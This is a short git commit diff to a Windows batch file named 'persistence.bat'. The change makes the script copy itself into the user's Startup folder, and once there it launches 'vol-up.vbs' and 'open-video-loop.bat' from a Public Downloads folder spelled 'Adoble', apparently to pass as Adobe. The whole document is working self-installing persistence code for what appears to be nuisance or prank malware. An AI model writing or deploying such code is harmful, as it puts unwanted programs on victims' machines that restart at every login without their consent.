67675e222c27de3c934ff6c8f1a86336e21fbf61
x11301z <117975795+x11301z@users.noreply.github.com>
2022-11-15 14:23:51 +1100

    Update persistence.bat

--- persistence.bat
+++ persistence.bat
@@ -1,7 +1,12 @@
 @echo off
 
+if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
+
 C:\Users\Public\Downloads\Adoble\vol-up.vbs
 
 C:\Users\Public\Downloads\Adoble\open-video-loop.bat
+
+) else (
+copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 cls
